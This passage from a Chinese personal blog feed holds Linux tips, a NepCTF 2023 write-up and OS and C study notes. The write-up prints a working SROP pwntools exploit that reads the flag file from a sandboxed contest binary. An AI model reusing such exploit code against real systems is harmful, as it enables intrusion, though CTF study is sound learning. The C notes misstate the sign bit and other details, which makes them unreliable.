的存在，它们只知道从自己的输入输出流中进行读写。 对于上面这种情况， <em>shell</em> (权限为您的当前用户) 在设置 <code>sudo echo</code> 前尝试打开 brightness 文件并写入，但是系统拒绝了 shell 的操作因为此时 shell 不是根用户。</p><p>明白这一点后，我们可以这样操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> 3 | sudo <span class="built_in">tee</span> brightness</span> </span><br></pre></td></tr></table></figure><p>因为打开 <code>/sys</code> 文件的是 <code>tee</code> 这个程序，并且该程序以 <code>root</code> 权限在运行，因此操作可以进行。</p><p>当有权限修改文件但无法修改文件所在目录时，即无法删除文件，只可将其制空</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xdg-<span class="keyword">open</span> binary <span class="type">name</span>#适用Linux just <span class="keyword">open</span> <span class="keyword">on</span> the Mac <span class="keyword">system</span> Windows didn<span class="string">&#x27;t work</span></span><br></pre></td></tr></table></figure><h3 id="Shell-Tools-and-Scripting"><a href="#Shell-Tools-and-Scripting" class="headerlink" title="Shell Tools and Scripting"></a>Shell Tools and Scripting</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/m/tools &gt; &gt; &gt;<span class="built_in">echo</span> <span class="string">&quot;value is <span class="variable">$foo</span>&quot;</span></span><br><span class="line">value is bash</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~<span class="regexp">/m/</span>tools &gt; &gt; &gt;echo <span class="string">&#x27;value is $foo&#x27;</span></span><br><span class="line">vlaue is <span class="symbol">$foo</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 碎片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nep摸鱼记</title>
      <link href="/2023/11/27/NepCTF%202023/"/>
      <url>/2023/11/27/NepCTF%202023/</url>
      
        <content type="html"><![CDATA[<h2 id="NepCTF-2023"><a href="#NepCTF-2023" class="headerlink" title="NepCTF 2023"></a>NepCTF 2023</h2><p>为什么开赛两分钟选择不打了？<br>答案很简单：<del>签到题格式打错了…运营姐姐没回我…48h…</del><br>炮灰pwn不会做！！！（其实可以做misc）</p><h3 id="Msic"><a href="#Msic" class="headerlink" title="Msic"></a>Msic</h3><h4 id="code"><a href="#code" class="headerlink" title="code"></a>code</h4><p>题目提示flag在环境变量中 <del>开始STFW</del><br><a href="https://blog.csdn.net/aspnet_lyc/article/details/20548767">https://blog.csdn.net/aspnet_lyc/article/details/20548767</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** arge)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(*arge)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *arge++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814162812545.png" alt="image-20230814162812545"></p><h4 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h4><p>求助chat因为不会用<del>copilot</del></p><h4 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h4><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814174205317.png" alt="image-20230814174205317"></p><p>五子棋 不会写脚本干下吧hh（求助chat也不是不行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">r = remote(<span class="string">&#x27;nepctf.1cepeak.cn&#x27;</span>, <span class="number">31762</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getboard</span>():</span><br><span class="line">    board = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        data = r.recvline().decode()[<span class="number">3</span>:].replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27; &#x27;</span>).strip()</span><br><span class="line">        data = data.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        board.append(data)</span><br><span class="line">    <span class="keyword">return</span> board</span><br><span class="line">table = <span class="string">&#x27;abcdefghijklmno&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    res = r.recvline().decode()</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">int</span>(res.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]) &gt;= <span class="number">38</span>):</span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    board = getboard()</span><br><span class="line">    random_x = random.randint(<span class="number">0</span>, <span class="number">14</span>)</span><br><span class="line">    random_y = random.randint(<span class="number">0</span>, <span class="number">14</span>)</span><br><span class="line">    <span class="keyword">while</span> board[random_y][random_x] != <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">        random_x = random.randint(<span class="number">0</span>, <span class="number">14</span>)</span><br><span class="line">        random_y = random.randint(<span class="number">0</span>, <span class="number">14</span>)</span><br><span class="line">    pos = table[random_x] + table[random_y]</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(pos)</span><br><span class="line">    r.recvline()</span><br></pre></td></tr></table></figure><h4 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h4><p>  根据提示A同学 开始bing 结果 竟然 看过 （我有罪）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814195648669.png" alt="image-20230814195648669"></p><p>​    </p><h3 id="PWN复现"><a href="#PWN复现" class="headerlink" title="PWN复现"></a>PWN复现</h3><p>  不是我说 是真不会但是跟着复现cve 从中学到了很多</p><h4 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h4><p>题目提示classic pwn</p><p>先seccomp-tools查看是否有沙盒<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230816102445148.png" alt="image-20230816102445148"></p><p>really exist！<br>有沙盒，只能使用open，read，write函数. goto 0009中0009是return ALLOW说明允许执行.<br>若为goto 00010则被禁用. </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230816104100112.png" alt="image-20230816104100112"></p><p>​    注意是call syscall函数而不是直接syscall 所以寄存器会有偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;nepctf.1cepeak.cn&quot;</span>,<span class="number">30307</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;welcome to NepCTF2023!&quot;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">syscall = <span class="number">0x4005B0</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0x500</span>)</span><br><span class="line">read_function = SigreturnFrame()</span><br><span class="line">read_function.rdi = <span class="number">0</span></span><br><span class="line">read_function.rsi = <span class="number">0</span></span><br><span class="line">read_function.rdx = bss_addr-<span class="number">0x8</span></span><br><span class="line">read_function.rcx = <span class="number">0x500</span></span><br><span class="line">read_function.rip = syscall</span><br><span class="line">read_function.rsp = bss_addr</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(read_function)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span> = SigreturnFrame()</span><br><span class="line"><span class="built_in">open</span>.rdi = <span class="number">2</span></span><br><span class="line"><span class="built_in">open</span>.rsi = bss_addr-<span class="number">0x8</span></span><br><span class="line"><span class="built_in">open</span>.rdx = <span class="number">0</span></span><br><span class="line"><span class="built_in">open</span>.rcx = <span class="number">0</span></span><br><span class="line"><span class="built_in">open</span>.rip = syscall</span><br><span class="line"><span class="built_in">open</span>.rsp = bss_addr + <span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">read_function = SigreturnFrame()</span><br><span class="line">read_function.rdi = <span class="number">0</span></span><br><span class="line">read_function.rsi = <span class="number">3</span></span><br><span class="line">read_function.rdx = bss_addr - <span class="number">0x200</span></span><br><span class="line">read_function.rcx = <span class="number">0x100</span></span><br><span class="line">read_function.rip = syscall</span><br><span class="line">read_function.rsp = bss_addr + <span class="number">0x220</span></span><br><span class="line"></span><br><span class="line">write_funtion = SigreturnFrame()</span><br><span class="line">write_funtion.rdi = <span class="number">1</span></span><br><span class="line">write_funtion.rsi = <span class="number">1</span></span><br><span class="line">write_funtion.rdx = bss_addr - <span class="number">0x200</span></span><br><span class="line">write_funtion.rcx = <span class="number">0x100</span></span><br><span class="line">write_funtion.rip = syscall</span><br><span class="line">write_funtion.rsp = bss_addr+<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(<span class="built_in">open</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x108</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(read_function)</span><br><span class="line">payload = payload.ljust(<span class="number">0x208</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(write_funtion)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><p>Nepctf{SROP_IT_IS_EAsY_6ee3e57b-3982-4924-844a-d362c3006b20}</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OS碎片</title>
      <link href="/2023/11/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/11/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p>CDU复习资料倾情献上.<br>（其实有更全的考点 有需要私信dd我 是的我是懒狗懒得导过来）</p><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><strong>操作系统是一个控制程序</strong><br><strong>操作系统是一个资源管理器</strong><br>应用程序与硬件之间的中间层<br>管理各种计算机硬件资源<br>提供访问计算机软硬件资源的高效手段<br>解决资源访问冲突 确保资源使用公平</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204113920281.png" alt="image-20240204113920281"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204113950135.png" alt="image-20240204113950135"></p><h3 id="操作系统的软件组成"><a href="#操作系统的软件组成" class="headerlink" title="操作系统的软件组成"></a>操作系统的软件组成</h3><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204114014147.png" alt="image-20240204114014147"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204114100956.png" alt="image-20240204114100956"></p><h3 id="操作系统内核特征"><a href="#操作系统内核特征" class="headerlink" title="操作系统内核特征"></a>操作系统内核特征</h3><p><strong>并发</strong><br>操作系统中有多个运行的程序 需要os管理和调度</p><p><strong>共享</strong><br>“同时”访问（宏观）<br>互斥共享（微观）</p><p><strong>虚拟</strong><br>利用多道程序设计 让每个用户觉得有一个计算机为ta提供服务</p><p><strong>异步</strong><br>程序的执行走走停停（可预测） 向前推进的速度不可预知<br>只要运行环境相同 os需要保证程序运行的结果也相同 （输入一致 输出结果应该是不变的）</p><h3 id="操作系统的主要功能"><a href="#操作系统的主要功能" class="headerlink" title="操作系统的主要功能"></a>操作系统的主要功能</h3><p>硬件抽象和协调管理 用户和硬件间沟通的桥梁</p><h3 id="操作系统的演变"><a href="#操作系统的演变" class="headerlink" title="操作系统的演变"></a>操作系统的演变</h3><p><strong>单用户系统</strong><br>操作系统&#x3D;装载器+通用子程序<br>昂贵组件低效率<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204120454111.png" alt="image-20240204120454111"></p><p>顺序执行 顺序打印<br>一个作业接一个作业</p><p><strong>批处理系统</strong><br><strong>多（道）程序系统</strong><br>交替执行<br>条件：前一个正在执行的程序主动让出CPU执行权</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204120646648.png" alt="image-20240204120646648"></p><p><strong>分时系统</strong><br>交替运行</p><p><strong>个人计算机</strong>：每个用户一个系统   吧<br>应用性</p><p><strong>分布式计算机</strong>：每个用户多个系统<br>安全性<br>网络成为一个重要的功能<br>通常支持分布式服务<br>  跨多系统的数据共享和协调<br>可能使用多个处理器（ 一台机器中可能使用多个CPU）<br>   松、紧耦合系统<br>高可用性与可靠性</p><h3 id="操作系统的结构"><a href="#操作系统的结构" class="headerlink" title="操作系统的结构"></a>操作系统的结构</h3><h4 id="简单结构"><a href="#简单结构" class="headerlink" title="简单结构"></a>简单结构</h4><p>MS-DOS<br>在最小的空间 设计用于提供大部分功能<br>没有拆分为模块<br>主要用汇编编写</p><h4 id="分层结构"><a href="#分层结构" class="headerlink" title="分层结构"></a>分层结构</h4><h4 id="微内核结构"><a href="#微内核结构" class="headerlink" title="微内核结构"></a>微内核结构</h4><p>尽可能多的内核功能移到用户态<br>用户态的应</p><h4 id="外核结构"><a href="#外核结构" class="headerlink" title="外核结构"></a>外核结构</h4><p>内核分配机器的物理资源给多个应用程序 并让每个程序决定如何处理这些资源<br>程序能链接到操作系统库（libOS）实现了操作系统抽象<br>保护与控制分离</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204135858817.png" alt="image-20240204135858817"></p><h4 id="VMM（虚拟机管理器）"><a href="#VMM（虚拟机管理器）" class="headerlink" title="VMM（虚拟机管理器）"></a>VMM（虚拟机管理器）</h4><p>将单独的机器接口转换成很多的虚拟机 每个虚拟机都是一个原始计算机系统的有效副本 并能完成所有的处理器指令</p><p>VMM负责资源的隔离 OS负责资源管理</p><h4 id="启动、中断、异常和系统调用"><a href="#启动、中断、异常和系统调用" class="headerlink" title="启动、中断、异常和系统调用"></a>启动、中断、异常和系统调用</h4><h5 id="启动时计算机内存和磁盘布局"><a href="#启动时计算机内存和磁盘布局" class="headerlink" title="启动时计算机内存和磁盘布局"></a>启动时计算机内存和磁盘布局</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240211110148513.png" alt="image-20240211110148513"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240211110326491.png" alt="image-20240211110326491"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240211110438193.png" alt="image-20240211110438193"></p><p>最后将控制权交到操作系统</p><p><strong>BIOS系统调用</strong><br>BIOS以中断调用的方式提供了基本的I&#x2F;O功能<br>INT 10h:字符显示<br>INT 13h:磁盘扇区读写<br>INT 15h:检测内存大小<br>INT 16h:键盘输入<br>只能在x86的实模式下访问</p><h4 id="计算机启动流程"><a href="#计算机启动流程" class="headerlink" title="计算机启动流程"></a>计算机启动流程</h4><p>系统加电 BIOS系统初始化（主引导记录 BIOS读取主引导扇区的代码）主引导记录扇区代码读取活动分区的引导扇区代码 加载程序（引导扇区代码读取文件系统的加载程序）</p><h5 id="CPU初始化"><a href="#CPU初始化" class="headerlink" title="CPU初始化"></a>CPU初始化</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240216135444045.png" alt="image-20240216135444045"></p><h5 id="BIOS初始化"><a href="#BIOS初始化" class="headerlink" title="BIOS初始化"></a>BIOS初始化</h5><h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240216135728291.png" alt="image-20240216135728291"></h5><h5 id="主引导记录MBR格式"><a href="#主引导记录MBR格式" class="headerlink" title="主引导记录MBR格式"></a>主引导记录MBR格式</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240216135943337.png" alt="image-20240216135943337"></p><h5 id="分区引导扇区格式"><a href="#分区引导扇区格式" class="headerlink" title="分区引导扇区格式"></a>分区引导扇区格式</h5><p>此处跳转指令跟系统有关 CPU不同指令不同<br>全部有512字节 活动分区用到64字节<br>启动代码存到硬盘上&#x2F;软盘上 决定加载程序存储位置</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240216140724616.png" alt="image-20240216140724616"></p><h5 id="加载程序"><a href="#加载程序" class="headerlink" title="加载程序"></a>加载程序</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240216140846749.png" alt="image-20240216140846749"></p><h4 id="系统启动规范"><a href="#系统启动规范" class="headerlink" title="系统启动规范"></a>系统启动规范</h4><h5 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h5><p>固化到计算机主板上的程序<br>包括系统设置、自检程序和系统自启动程序<br>BIOS-MBR（主引导记录）、BIOS-GPT（全局唯一标识分区表）、PXE（网络启动标准）</p><p>UEFI（统一可扩展固件接口）<br>接口标准<br>在所有平台上一致的操作系统启动服务<br>可信启动流程 BIOS启动后 会对引导记录进行检查 只有有标签的代码可执行</p>]]></content>
      
      
      <categories>
          
          <category> 碎片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C探索碎片——操作符</title>
      <link href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/"/>
      <url>/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<p>C的探索碎片——操作符</p><p> <img src="https://img-blog.csdnimg.cn/img_convert/2f25a996e53a0589036894fc5c92a086.gif" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><ol><li><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3></li></ol><p>算术操作符</p><p>移位操作符</p><p>位操作符</p><p>赋值操作符</p><p>单目操作符</p><p>关系操作符</p><p>逻辑操作符</p><p>条件操作符</p><p>逗号表达式</p><p>下标引用、函数调用和结构成员</p><h4 id="一-算数操作符"><a href="#一-算数操作符" class="headerlink" title="一.算数操作符"></a>一.算数操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+  -  *  /  % </span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>+、-、*此类数学中常见的算数符号我们再熟悉不过，需要注意的是&#x2F;（除），%（取余）之间的区别。</p><p>例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio,h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a/<span class="number">3</span>);<span class="comment">//结果为3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a%<span class="number">3</span>);<span class="comment">//结果为1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>注意：1.除%操作符之外。其他几个操作符可以作用于整数和浮点数。</p><p>2.&#x2F;操作符运算时若两个操作数中含浮点数则执行浮点数除法（%lf打印结果）；若两操作数都为整数则执行整数除法。</p><p>3.%操作符的两个操作数必须为整数。</p><h4 id="二、移位操作符"><a href="#二、移位操作符" class="headerlink" title="二、移位操作符"></a>二、移位操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;  左移操作符</span><br><span class="line">&gt;&gt;  右移操作符</span><br><span class="line">注：移位操作符的操作数只能是整数。</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><em>移位操作符移动的是二进制的位，</em>而整数在内存中以补码的形式进行存储，屏幕上又以原码显示。</p><p>补充：</p><p><strong>原码</strong>：把一个数按正负直接翻译成二进制；</p><p><strong>反码</strong>：对原码进行按位取（即0变为1，1变为0）反得到反码；</p><p><strong>补码</strong>：反码+1得补码。</p><p>对于正整数原码反码补码相同，负整数则需计算。</p><p>计算方法：原码符号位（二进制表示的最高一位，是0表示为负数，是1表示为正数）不变，其他位按位取反得到反码，+1得到补码。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/577aafbe300b6819adb36ad9ca0b8713.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>移位规则：</p><ol><li>左移操作符：左边抛弃、右边补0。</li></ol><p><img src="https://img-blog.csdnimg.cn/img_convert/7dea2e4433fabdfafcc5e51f99be91f8.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><ol><li>右移操作符（由编译器决定）：</li></ol><p>逻辑移位</p><p>左边用0填充，右边丢弃。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/97b52d3e735c5b8e80b4087060038946.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>算术移位</p><p>左边用原该值的符号位填充，右边丢弃。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c94a1583fad019f42f8fafa14d6897e5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>警告⚠：</p><p>对于移位运算符，不要移动负数位，这个是标准未定义的。</p><h4 id="三、位操作符"><a href="#三、位操作符" class="headerlink" title="三、位操作符"></a>三、位操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;//按位与</span><br><span class="line">|//按位或</span><br><span class="line">^//按位异或</span><br><span class="line">注：它们的操作数必须为整数。</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>均对二进制进行操作。</p><p>&amp;：有0为0，均1为1；</p><p>|：有 1为1，均0为0；</p><p>^：相同为0，相异为1，且保证不会栈溢出。</p><p>小tip：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a ^ a = 0;</span><br><span class="line">0 ^ a = a;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h4 id="四、赋值操作符"><a href="#四、赋值操作符" class="headerlink" title="四、赋值操作符"></a>四、赋值操作符</h4><p>其实就是对“&#x3D;”的运用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">赋值操作符可以连续使用，比如：</span><br><span class="line">int a = 10;</span><br><span class="line">int x = 0;</span><br><span class="line">int y = 20;</span><br><span class="line">a = x = y+1;//连续赋值</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><strong>复合赋值符</strong></p><p>+&#x3D;</p><p>-&#x3D;</p><p>*&#x3D;</p><p>&#x2F;&#x3D;</p><p>%&#x3D;</p><p>&gt;&gt;&#x3D;</p><p>&lt;&lt;&#x3D;</p><p>&amp;&#x3D;</p><p>|&#x3D;</p><p>^&#x3D;</p><p>可以自己进行实践探索具体功能🌸</p><h4 id="五、单目操作符"><a href="#五、单目操作符" class="headerlink" title="五、单目操作符"></a>五、单目操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">! 逻辑反操作</span><br><span class="line">- 负值</span><br><span class="line">+ 正值</span><br><span class="line">&amp; 取地址</span><br><span class="line">sizeof 操作数的类型长度（以字节为单位）</span><br><span class="line">~ 对一个数的二进制按位取反</span><br><span class="line">-- 前置、后置--</span><br><span class="line">++ 